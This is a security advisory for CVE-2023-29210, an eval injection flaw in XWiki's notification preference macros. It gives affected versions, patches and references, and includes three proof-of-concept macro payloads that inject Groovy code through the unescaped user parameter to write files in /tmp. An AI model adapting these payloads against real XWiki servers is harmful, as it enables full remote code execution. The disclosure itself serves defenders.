# org.xwiki.platform:xwiki-platform-notifications-ui Eval Injection vulnerability

**GHSA**: GHSA-p9mj-v5mf-m82x | **CVE**: CVE-2023-29210 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-94, CWE-95

**Affected Packages**:
- **org.xwiki.platform:xwiki-platform-notifications-ui** (maven): >= 13.2-rc-1, < 13.10.11
- **org.xwiki.platform:xwiki-platform-notifications-ui** (maven): >= 14.0-rc-1, < 14.4.7
- **org.xwiki.platform:xwiki-platform-notifications-ui** (maven): >= 14.5, < 14.10

## Description

### Impact
Any user with view rights on commonly accessible documents including the notification preferences macros can execute arbitrary Groovy, Python or Velocity code in XWiki leading to full access to the XWiki installation. The root cause is improper escaping of the user parameter of the macro that provide the [notification filters](https://extensions.xwiki.org/xwiki/bin/view/Extension/Notifications%20Application/#HFilters). These macros are used in the user profiles and thus installed by default in XWiki.

A proof of concept exploit is

```
{{notificationsFiltersPreferences target="user" user="~" /~}~} {{async async=~"true~" cached=~"false~" context=~"doc.reference~"~}~}{{groovy~}~}new File(~"/tmp/exploit.txt~").withWriter { out -> out.println(~"created from filter preferences!~"); }{{/groovy~}~}{{/async~}~}"/}}

{{notificationsAutoWatchPreferences target="user" user="~" /~}~} {{async async=~"true~" cached=~"false~" context=~"doc.reference~"~}~}{{groovy~}~}new File(~"/tmp/exploit2.txt~").withWriter { out -> out.println(~"created from auto watch preferences!~"); }{{/groovy~}~}{{/async~}~}"/}}

{{notificationsEmailPreferences target="user" user="~" /~}~} {{async async=~"true~" cached=~"false~" context=~"doc.reference~"~}~}{{groovy~}~}new File(~"/tmp/exploit3.txt~").withWriter { out -> out.println(~"created from email filter preferences!~"); }{{/groovy~}~}{{/async~}~}"/}}
```

If this creates files inside `/tmp`, the installation is vulnerable.

### Patches
The vulnerability has been patched in XWiki 13.10.11, 14.4.7 and 14.10.

### Workarounds
The issue can be fixed by patching the code in the affected macros that are contained in XWiki documents as shown in the [patch](https://github.com/xwiki/xwiki-platform/commit/cebf9167e4fd64a8777781fc56461e9abbe0b32a) for this issue.

### References
* https://github.com/xwiki/xwiki-platform/commit/cebf9167e4fd64a8777781fc56461e9abbe0b32a
* https://jira.xwiki.org/browse/XWIKI-20259

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)
* Email us at [Security Mailing List](mailto:security@xwiki.org)

